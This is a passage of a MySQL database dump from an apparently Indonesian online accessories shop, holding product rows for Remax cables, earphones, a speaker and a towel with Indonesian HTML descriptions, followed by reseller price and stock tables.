(54,'Remax Cable SUDA 3 in 1 Ori','Remax Original Brand','RemaxCableSUDA',85000,135000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Remax Cable SUDA 3 in 1 Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">3-in-1 USB Cable for All Type of Device</span></div><div><span style=\"color: rgb(0, 0, 0);\">Dengan kabel USB dari Remax ini Anda tidak perlu membawa kabel yang berbeda - beda untuk setiap perangkat Anda. Di ujung kabel ini Anda akan menemukan 3 jenis port berbeda yaitu Lightning, USB Type-C dan Micro USB membuatnya kompatibel dengan perangkat -perangkat terbaru saat ini.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">FEATURES :</span></div><div><span style=\"color: rgb(0, 0, 0);\">• One Cable for All Your Device : Berbeda dengan kabel biasa. kabel dari Remax ini dilengkapi dengan 3 port berbeda membuatnya bisa digunakan untuk perangkat yang berbeda - beda. Kehadiran port Lightning, USB Type-C dan Micro USB memastikan kompatibilitas yang tinggi untuk berbagai perangkat yang baru.&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\">• High Quality Material : Material kabel yang kuat membuatnya tidak mudah putus sehingga dapat digunakan untuk waktu yang lama. Tidak hanya itu saja, kabel ini kompatibel dengan adapter charger 2.1A membuat Anda bisa mengisi daya perangkat dalam waktu singkat.&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Elegant Design : Desain kabel yang tidak norak dan dipadukan dengan penggunaan warna netral membuatnya terlihat sangat elegan saat digunakan.&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Color : Black</span></div><div><br></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 12:46:58',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Remax Cable SUDA 3 in 1 Or'),
(55,'Remax Handsfree Sporty Bluetooth Ori','Remax Original Brand','RemaxHandsfreeSportyBluetoothOri',245000,549000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Remax Handsfree Sporty Bluetooth Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Hadir dengan design aluminum yang modis. Memiliki microphone untuk menjawab panggilan telepon dan volume control untuk mengatur besar suara, Anda dapat melakukan panggilan ulang pada panggilan terakhir dengan tombol.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Features :</span></div><div><br></div><div><span style=\"color: rgb(0, 0, 0);\">• Bluetooth 4.1 : Dengan menggunakan bluetooth 4.1, Anda dapat mendengarkan lagu maupun menjawab telepon dengan kualitas suara yang maksimal dan tanpa jeda.</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Comfortable Earbuds : Earbuds didesign agar nyaman digunakan tertuma saat bergerak, headset ini tidak mudah terjatuh dan tetap menempel dengan stabil ditelinga Anda.</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Redial : Anda dapat melakukan panggilan ulang pada panggilan terakhir dengan menekan tombol sebanyak 2 kali.</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Optimized Sound Quality : Penerima suara dari Remax earphone&nbsp; ini menggunakan driver yang berkualitas sehingga suara yang dihasilkan sangat jernih.</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Microphone &amp; Volume Control : Earphone ini memiliki microphone yang dapat digunakan untuk menjawab telepon langsung dari earphone tanpa perlu menyentuh smartphone. Volume control berfungsi untuk membesarkan dan mengecilkan suara musik.</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 13:17:05',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Remax Handsfree Sporty'),
(56,'Remax H/F Bluetooth mini Ori','Remax Original Brand','RemaxHFBluetoothmini',120000,225000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Remax H/F Bluetooth mini Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">PRODUK ORIGINAL 100%</span></div><div><span style=\"color: rgb(0, 0, 0);\">Hati - Hati Banyak barang palsu. Kami adalah distributor tangan pertama Remax.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">REMAX Mini Portable Wireless Bluetooth 4.2 Single Headset Earphone dengan Mic - Hitam</span></div><div><span style=\"color: rgb(0, 0, 0);\">Gaya klasik dan mini, pengalaman yang nyaman.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Bluetooth V4.2, konsumsi daya yang rendah dan pasangan tercepat</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Dengan mikrofon, Anda dapat menjawab panggilan handsfree saat mengemudi</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Dengan unit speaker 10mm, memberi Anda pengalaman musik yang unik. Baterai 50 mAh built-in, hingga 100 jam waktu siaga. Terhubung dengan dua perangkat pada saat bersamaan. Desain ergonomis, nyaman dan mantap Ringan dan portabel, mudah menggunakannya saat bepergian dan mengemudi</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Warna : Green, Red</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Spesifikasi:</span></div><div><span style=\"color: rgb(0, 0, 0);\">Merek: REMAX</span></div><div><span style=\"color: rgb(0, 0, 0);\">Versi Bluetooth: V4.2</span></div><div><span style=\"color: rgb(0, 0, 0);\">Protokol dukungan: HSP / HFP</span></div><div><span style=\"color: rgb(0, 0, 0);\">Jangkauan transmisi: 10 m</span></div><div><span style=\"color: rgb(0, 0, 0);\">Respon frekuensi: 20Hz-20KHz</span></div><div><span style=\"color: rgb(0, 0, 0);\">ensitivitas mic: -42dB</span></div><div><span style=\"color: rgb(0, 0, 0);\">Kapasitas baterai: 50 mAh</span></div><div><span style=\"color: rgb(0, 0, 0);\">Dinilai daya: 60mW</span></div><div><span style=\"color: rgb(0, 0, 0);\">Unit speaker: 10mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">Waktu kerja: sekitar 3 jam</span></div><div><span style=\"color: rgb(0, 0, 0);\">Waktu siaga: sekitar 48 jam</span></div><div><span style=\"color: rgb(0, 0, 0);\">Waktu pengisian: sekitar 1,5 jam</span></div><div><span style=\"color: rgb(0, 0, 0);\">Panggilan cepat: dukungan</span></div><div><span style=\"color: rgb(0, 0, 0);\">Cocok dengan:</span></div><div><span style=\"color: rgb(0, 0, 0);\">iPhone 8 Plus</span></div><div><span style=\"color: rgb(0, 0, 0);\">iPhone 8</span></div><div><span style=\"color: rgb(0, 0, 0);\">iPhone X</span></div><div><span style=\"color: rgb(0, 0, 0);\">Samsung Galaxy Note 8</span></div><div><span style=\"color: rgb(0, 0, 0);\">Perangkat berkemampuan Bluetooth lainnya</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">• Brand Name:REMAX</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Support APP:No</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Is wireless:Yes</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Style:In-Ear</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Waterproof:No</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Sensitivity:93±3dB</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Volume Control:No</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Active Noise-Cancellation:No</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Function:For Mobile Phone,For iPod,Sport</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Plug Type:Wireless</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Frequency Response Range:20-20000Hz</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Communication:Wireless</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Line Length:None</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Support Memory Card:No</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Wireless Type:Bluetooth</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Control Button:Yes</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Support Apt-x:No</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Connectors:None</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Resistance:32?</span></div><div><span style=\"color: rgb(0, 0, 0);\">• Vocalism Principle:Dynamic</span></div><div><span style=\"color: rgb(0, 0, 0);\">• With Microphone:Yes</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 14:31:19',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Remax H/F Bluetooth mini'),
(57,'Bluetooth Earphone Remax Ori','Remax Original Brand','EarphoneRemax',160000,275000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Bluetooth Earphone Remax Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\">Bluetooth Earphone Remax Ori ini hadir dengan teknologi bluetooth sehingga Anda tidak perlu pusing dengan kabel yang menggangu pergerakan Anda saat sedang beraktifitas / berolahraga. Earphone ini juga memiliki volume control dan microphone.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">FEATURES</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Bluetooth Earphone</span></div><div><span style=\"color: rgb(0, 0, 0);\">Earphone ini terhubung ke smartphone dan mp3 menggunakan koneksi bluetooth sehingga Anda tidak terganggu lagi dengan kabel yang menggantung. Dengan ini Anda dapat beraktifitas lebih leluasa dan nyaman sambil mendegar lagu.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Comfortable Earbuds</span></div><div><span style=\"color: rgb(0, 0, 0);\">Earbuds didesain agar nyaman digunakan tertuma saat bergerak, headset ini tidak mudah terjatuh dan tetap menempel dengan stabil ditelinga Anda.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Optimized Sound Quality</span></div><div><span style=\"color: rgb(0, 0, 0);\">Penerima suara dari Remax Bluetooth Headset ini menggunakan chip yang berkualitas sehingga suara yang dihasilkan sangat jernih.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Microphone and Volume Control</span></div><div><span style=\"color: rgb(0, 0, 0);\">Earphone ini memiliki microphone yang dapat digunakan untuk menjawab bertelepon dan juga volume control untuk mengubah volume suara tanpa perlu menyentuh smartphone.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Ultra Long Standby Battery</span></div><div><span style=\"color: rgb(0, 0, 0);\">Baterai dari Remax headset ini mampu bertahan hingga 80 jam mode standby dalam sekali pengisian baterai, dan 4 jam berturut turut untuk digunakan.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Magnet Case</span></div><div><span style=\"color: rgb(0, 0, 0);\">Case bagian luar earphone ini memiliki magnet sehingga Anda dapat menempel earphone kiri kanan menjadi satu dan menjadikan earphone seperti kalung.</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 14:41:37',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Bluetooth Earphone Remax'),
(58,'Earphone Bluetooth Sports Edition Remax Ori','Remax Original Brand','EarphoneBluetoothSports',260000,599000,90,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Earphone Bluetooth Sports Edition Remax Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Earphone ini di desain khusus untuk keperluan berolahraga, dengan bentuk kabel dan earbuds yang digunakan dengan cara dilingkar di telinga membuat earphone ini sangat nyaman dan tidak mudah lepas saat digunakan sambil beraktifitas dan juga ditambah dengan konektifitas nirkabel melalui jaringan bluetooth.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Frekuensi Respon 20-20kHz</span></div><div><span style=\"color: rgb(0, 0, 0);\">Total Power Output 3mW</span></div><div><span style=\"color: rgb(0, 0, 0);\">Sensitivity 86+-3dB</span></div><div><span style=\"color: rgb(0, 0, 0);\">Koneksi Bluetooth V4.2</span></div><div><span style=\"color: rgb(0, 0, 0);\">Kapasitas Baterai 65mAh&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\">Music Time: 3.5h</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">VARIAN : Yellow &amp; Red</span></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 14:54:14',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Earphone Bluetooth Sports'),
(59,'Speaker Mini Bluetooth Remax Ori','Remax Original Brand','SpeakerMini',195000,295000,75,NULL,'<div><span style=\"color: rgb(0, 0, 0);\">Speaker Mini Bluetooth Remax Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Wireless Bluetooth Speaker Portable Mini metallic support TF card HD Sound Transport Call Function Speaker with Mic</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Dilengkapi dengan slot kartu microSD untuk pemutaran musik. Ada Auxiliary di</span></div><div><span style=\"color: rgb(0, 0, 0);\">pelabuhan (AUX) sehingga kamu dapat menghubungkan perangkat kamu ke speaker.</span></div><div><span style=\"color: rgb(0, 0, 0);\">Desain elegant dan premium.</span></div><div><span style=\"color: rgb(0, 0, 0);\">.</span></div><div><span style=\"color: rgb(0, 0, 0);\">Speaker ini juga mampu menerima panggilan telepon saat terhubung ke smartphone</span></div><div><span style=\"color: rgb(0, 0, 0);\">melalui mikrofon khusus, yang membuat produk ini serbaguna.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Highlights :</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) Bluetooth versi 4.0</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) Micro SD Slot</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) AUX PORT</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) CNC Aluminium Material</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) Dual Driver 3W</span></div><div><span style=\"color: rgb(0, 0, 0);\">Detail body dengan design yang original dibuat dari bahan material full metal</span></div><div><span style=\"color: rgb(0, 0, 0);\">menampilkan kesan yang elegan dan kokoh serta berfungsi untuk memancarkan suara</span></div><div><span style=\"color: rgb(0, 0, 0);\">yang lebih jernih dan berkualitas.</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) Built In HD Microphone</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) Size 85 x 85 x 34mm</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) 5 Jam Pemakaian terus-menerus</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) 14 Jam Waktu Bicara</span></div><div><span style=\"color: rgb(0, 0, 0);\">(+) 60 Jam Standby</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Range : 10 m</span></div><div><span style=\"color: rgb(0, 0, 0);\">Kekuatan Speaker : 3W</span></div><div><span style=\"color: rgb(0, 0, 0);\">Power : DC5+-0.25V</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Apa yang ada di dalam kotak:</span></div><div><span style=\"color: rgb(0, 0, 0);\">1* Speaker Mini Bluetooth Remax Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\">1* USB Cable&nbsp;</span></div><div><span style=\"color: rgb(0, 0, 0);\">1* Audio Cable</span></div><div><span style=\"color: rgb(0, 0, 0);\">1* Manual</span></div><div><br></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 15:09:38',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Speaker Mini Bluetooth'),
(60,'Handuk Sport Edition Remax Ori','Remax Original Brand','HandukSport',125000,175000,99,NULL,'<div><div><span style=\"color: rgb(0, 0, 0);\">Handuk Sport Edition Remax Ori</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Features</span></div><div><span style=\"color: rgb(0, 0, 0);\">Fast Dry Towel</span></div><div><span style=\"color: rgb(0, 0, 0);\">Handuk ini memang didesian khusus untuk kebutuhan olahraga yang mengeluarkan keringat sangat banyak. Handuk dapat menyerap keringat dengan cepat dan langsung dapat kering dalam sekejap sehingga handuk tidak terlalu basah.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">Cold Towel</span></div><div><span style=\"color: rgb(0, 0, 0);\">Selain cepat kering, handuk ini juga memberi sensasi dingin pada kulit tubuh sehingga Anda tidak merasa terbeban saat menggantung handuk di leher. Karena handuk pada umumnya pasti membuat gerah bagian tubuh yang bersentuhan dengan handuk.</span></div><div><span style=\"color: rgb(0, 0, 0);\"><br></span></div><div><span style=\"color: rgb(0, 0, 0);\">3 Layer Towel</span></div><div><span style=\"color: rgb(0, 0, 0);\">Hot to Cold</span></div><div><span style=\"color: rgb(0, 0, 0);\">Untuk mendinginkan kembali handuk Remax ini dapat dilakukan dengan cari mencelup handuk ke air panas selama beberapa saat dan kemudian keringkan sekitar 3-5 menit. Setelah itu handuk akan kembali dingin.</span></div></div><div><br></div>',NULL,0,'2019-07-07 00:00:00','2019-07-07 15:23:11',NULL,NULL,'https://sanporium.com/product-category/aksesoris/','6282283401530','Hai Min, Saya Mau Pesan Handuk Sport Edition Remax');

/*Table structure for table `product_prices` */

DROP TABLE IF EXISTS `product_prices`;

CREATE TABLE `product_prices` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) DEFAULT NULL,
  `reseller_package_id` bigint(20) DEFAULT NULL,
  `agent_price` double NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=98 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `product_prices` */

insert  into `product_prices`(`id`,`product_id`,`reseller_package_id`,`agent_price`,`created_at`,`updated_at`) values 
(1,2,NULL,0,NULL,NULL),
(2,5,3,290000,'2019-07-24 17:04:02','2019-07-24 17:04:02'),
(3,5,4,300000,'2019-07-24 17:04:02','2019-07-24 17:04:02'),
(4,6,3,1111,'2019-07-24 17:21:27','2019-07-24 17:21:27'),
(5,6,4,1111,'2019-07-24 17:21:27','2019-07-24 17:21:27'),
(6,7,3,185000,'2019-07-24 17:24:04','2019-07-29 11:39:45'),
(7,7,4,150000,'2019-07-24 17:24:04','2019-07-29 11:39:45'),
(8,8,3,135000,'2019-07-24 17:26:35','2019-07-24 17:26:35'),
(9,8,4,130000,'2019-07-24 17:26:35','2019-07-24 17:26:35'),
(10,9,3,147000,'2019-07-24 17:27:53','2019-07-24 17:27:53'),
(11,9,4,142000,'2019-07-24 17:27:53','2019-07-24 17:27:53'),
(12,10,3,147000,'2019-07-24 17:28:54','2019-07-24 17:28:54'),
(13,10,4,142000,'2019-07-24 17:28:54','2019-07-24 17:28:54'),
(14,11,3,243000,'2019-07-30 04:06:28','2019-07-30 04:06:28'),
(15,11,4,238000,'2019-07-30 04:06:28','2019-07-30 04:06:28'),
(16,12,3,135000,'2019-07-30 04:11:23','2019-07-30 04:11:23'),
(17,12,4,130000,'2019-07-30 04:11:23','2019-07-30 04:11:23'),
(18,13,3,147000,'2019-07-30 04:13:47','2019-07-30 04:13:47'),
(19,13,4,142000,'2019-07-30 04:13:47','2019-07-30 04:13:47'),
(20,14,3,263000,'2019-07-30 04:15:40','2019-07-30 04:15:40'),
(21,14,4,258000,'2019-07-30 04:15:40','2019-07-30 04:15:40'),
(22,15,3,182000,'2019-07-30 06:45:14','2019-07-30 06:45:14'),
(23,15,4,177500,'2019-07-30 06:45:14','2019-07-30 06:45:14'),
(24,16,3,155000,'2019-07-30 06:49:10','2019-07-30 06:49:10'),
(25,16,4,150000,'2019-07-30 06:49:10','2019-07-30 06:49:10'),
(26,17,3,202000,'2019-07-30 06:56:59','2019-07-30 06:56:59'),
(27,17,4,197000,'2019-07-30 06:56:59','2019-07-30 06:56:59'),
(28,18,3,175000,'2019-07-30 07:11:06','2019-07-30 07:11:06'),
(29,18,4,170000,'2019-07-30 07:11:06','2019-07-30 07:11:06'),
(30,19,3,182000,'2019-07-30 07:20:33','2019-07-30 07:20:33'),
(31,19,4,177000,'2019-07-30 07:20:33','2019-07-30 07:20:33'),
(32,20,3,207000,'2019-07-30 07:44:34','2019-07-30 07:44:34'),
(33,20,4,202000,'2019-07-30 07:44:34','2019-07-30 07:44:34'),
(34,21,3,227000,'2019-07-30 07:48:23','2019-07-30 07:48:23'),
(35,21,4,222000,'2019-07-30 07:48:23','2019-07-30 07:48:23'),
(36,22,3,105000,'2019-07-30 08:09:47','2019-07-30 08:09:47'),
(37,22,4,100000,'2019-07-30 08:09:47','2019-07-30 08:09:47'),
(38,23,3,210000,'2019-07-30 08:14:37','2019-07-30 08:14:37'),
(39,23,4,205000,'2019-07-30 08:14:37','2019-07-30 08:14:37'),
(40,24,3,220000,'2019-07-30 13:29:36','2019-07-30 13:29:36'),
(41,24,4,215000,'2019-07-30 13:29:36','2019-07-30 13:29:36'),
(42,25,3,210000,'2019-07-30 13:33:00','2019-07-30 13:33:00'),
(43,25,4,205000,'2019-07-30 13:33:00','2019-07-30 13:33:00'),
(44,26,3,273000,'2019-07-30 13:35:15','2019-07-30 13:35:15'),
(45,26,4,268000,'2019-07-30 13:35:15','2019-07-30 13:35:15'),
(46,27,3,220000,'2019-07-30 13:37:38','2019-07-30 13:37:38'),
(47,27,4,215000,'2019-07-30 13:37:38','2019-07-30 13:37:38'),
(48,28,3,308000,'2019-07-30 13:39:57','2019-07-30 13:39:57'),
(49,28,4,303000,'2019-07-30 13:39:57','2019-07-30 13:39:57'),
(50,29,3,280000,'2019-07-30 13:41:55','2019-07-30 13:41:55'),
(51,29,4,275000,'2019-07-30 13:41:55','2019-07-30 13:41:55'),
(52,30,3,220000,'2019-07-30 13:44:47','2019-07-30 13:44:47'),
(53,30,4,215000,'2019-07-30 13:44:47','2019-07-30 13:44:47'),
(54,31,3,210000,'2019-07-30 13:47:03','2019-07-30 13:47:03'),
(55,31,4,205000,'2019-07-30 13:47:03','2019-07-30 13:47:03'),
(56,32,3,41000,'2019-07-30 14:21:03','2019-07-30 14:21:03'),
(57,32,4,36000,'2019-07-30 14:21:03','2019-07-30 14:21:03'),
(58,33,3,41000,'2019-07-30 14:23:23','2019-07-30 14:23:23'),
(59,33,4,36000,'2019-07-30 14:23:23','2019-07-30 14:23:23'),
(60,34,3,41000,'2019-07-30 14:25:28','2019-07-30 14:25:28'),
(61,34,4,36000,'2019-07-30 14:25:28','2019-07-30 14:25:28'),
(62,35,3,155000,'2019-07-30 14:27:46','2019-07-30 14:27:46'),
(63,35,4,150000,'2019-07-30 14:27:46','2019-07-30 14:27:46'),
(64,36,3,81000,'2019-07-30 14:30:53','2019-07-30 14:30:53'),
(65,36,4,76000,'2019-07-30 14:30:53','2019-07-30 14:30:53'),
(66,37,3,115000,'2019-07-30 14:33:49','2019-07-30 14:33:49'),
(67,37,4,110000,'2019-07-30 14:33:49','2019-07-30 14:33:49'),
(68,38,3,140000,'2019-07-30 14:37:45','2019-07-30 14:37:45'),
(69,38,4,135000,'2019-07-30 14:37:45','2019-07-30 14:37:45'),
(70,39,3,140000,'2019-07-30 14:37:50','2019-07-30 14:37:50'),
(71,39,4,135000,'2019-07-30 14:37:50','2019-07-30 14:37:50'),
(72,40,3,140000,'2019-07-30 14:37:57','2019-07-30 14:37:57'),
(73,40,4,135000,'2019-07-30 14:37:57','2019-07-30 14:37:57'),
(74,41,3,140000,'2019-07-30 14:38:12','2019-07-30 14:38:12'),
(75,41,4,135000,'2019-07-30 14:38:12','2019-07-30 14:38:12'),
(76,42,3,140000,'2019-07-30 14:38:40','2019-07-30 14:38:40'),
(77,42,4,135000,'2019-07-30 14:38:40','2019-07-30 14:38:40'),
(78,43,3,140000,'2019-07-30 14:38:58','2019-07-30 14:38:58'),
(79,43,4,135000,'2019-07-30 14:38:58','2019-07-30 14:38:58'),
(80,44,3,140000,'2019-07-30 14:43:15','2019-07-30 14:43:15'),
(81,44,4,135000,'2019-07-30 14:43:15','2019-07-30 14:43:15'),
(82,45,3,278000,'2019-07-30 15:06:20','2019-07-30 15:06:20'),
(83,45,4,273000,'2019-07-30 15:06:20','2019-07-30 15:06:20'),
(84,46,3,290000,'2019-07-30 15:13:48','2019-07-30 15:13:48'),
(85,46,4,285000,'2019-07-30 15:13:48','2019-07-30 15:13:48'),
(86,47,3,255000,'2019-07-30 15:16:02','2019-07-30 15:16:02'),
(87,47,4,250000,'2019-07-30 15:16:02','2019-07-30 15:16:02'),
(88,48,3,182000,'2019-07-30 15:19:21','2019-07-30 15:19:21'),
(89,48,4,177000,'2019-07-30 15:19:21','2019-07-30 15:19:21'),
(90,49,3,341000,'2019-07-30 15:22:04','2019-07-30 15:22:04'),
(91,49,4,336000,'2019-07-30 15:22:04','2019-07-30 15:22:04'),
(92,50,3,255000,'2019-07-30 15:27:52','2019-07-30 15:27:52'),
(93,50,4,250000,'2019-07-30 15:27:52','2019-07-30 15:27:52'),
(94,51,3,288000,'2019-07-30 15:29:54','2019-07-30 15:29:54'),
(95,51,4,283000,'2019-07-30 15:29:54','2019-07-30 15:29:54'),
(96,52,3,278000,'2019-07-30 15:33:02','2019-07-30 15:33:02'),
(97,52,4,275000,'2019-07-30 15:33:02','2019-07-30 15:33:02');

/*Table structure for table `product_stocks` */

DROP TABLE IF EXISTS `product_stocks`;

CREATE TABLE `product_stocks` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) NOT NULL,
  `color` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `size` enum('XXS','XS','S','M','L','XL','XXL','XXXL','XXXXL') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'L',
  `stock` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `product_stocks` */

insert  into `product_stocks`(`id`,`product_id`,`color`,`size`,`stock`,`created_at`,`updated_at`) values 
(1,1,'Merah','L',20,'2019-07-15 09:24:35','2019-07-15 09:24:35'),
(2,5,NULL,'L',20,'2019-07-24 17:04:02','2019-07-24 17:04:02'),
(3,6,NULL,'L',11,'2019-07-24 17:21:27','2019-07-24 17:21:27'),
(4,7,NULL,'L',100,'2019-07-24 17:24:04','2019-07-24 17:24:04'),
(5,8,NULL,'L',100,'2019-07-24 17:26:35','2019-07-24 17:26:35'),
(6,9,NULL,'L',100,'2019-07-24 17:27:53','2019-07-24 17:27:53'),
(7,10,NULL,'L',100,'2019-07-24 17:28:54','2019-07-24 17:28:54'),
(8,11,NULL,'L',100,'2019-07-30 04:06:28','2019-07-30 04:06:28'),
(9,12,NULL,'L',100,'2019-07-30 04:11:23','2019-07-30 04:11:23'),
(10,13,NULL,'L',100,'2019-07-30 04:13:47','2019-07-30 04:13:47'),
(11,14,NULL,'L',100,'2019-07-30 04:15:40','2019-07-30 04:15:40'),
(12,15,NULL,'L',100,'2019-07-30 06:45:14','2019-07-30 06:45:14'),
(13,16,NULL,'L',100,'2019-07-30 06:49:10','2019-07-30 06:49:10'),
(14,17,NULL,'L',100,'2019-07-30 06:56:59','2019-07-30 06:56:59'),
(15,18,NULL,'L',100,'2019-07-30 07:11:06','2019-07-30 07:11:06'),
(16,19,NULL,'L',100,'2019-07-30 07:20:33','2019-07-30 07:20:33'),
(17,20,NULL,'L',100,'2019-07-30 07:44:34','2019-07-30 07:44:34'),
(18,21,NULL,'L',100,'2019-07-30 07:48:23','2019-07-30 07:48:23'),
(19,22,NULL,'L',100,'2019-07-30 08:09:47','2019-07-30 08:09:47'),
(20,23,NULL,'L',100,'2019-07-30 08:14:37','2019-07-30 08:14:37'),
(21,24,NULL,'L',100,'2019-07-30 13:29:36','2019-07-30 13:29:36'),
(22,25,NULL,'L',100,'2019-07-30 13:33:00','2019-07-30 13:33:00'),
(23,26,NULL,'L',100,'2019-07-30 13:35:15','2019-07-30 13:35:15'),
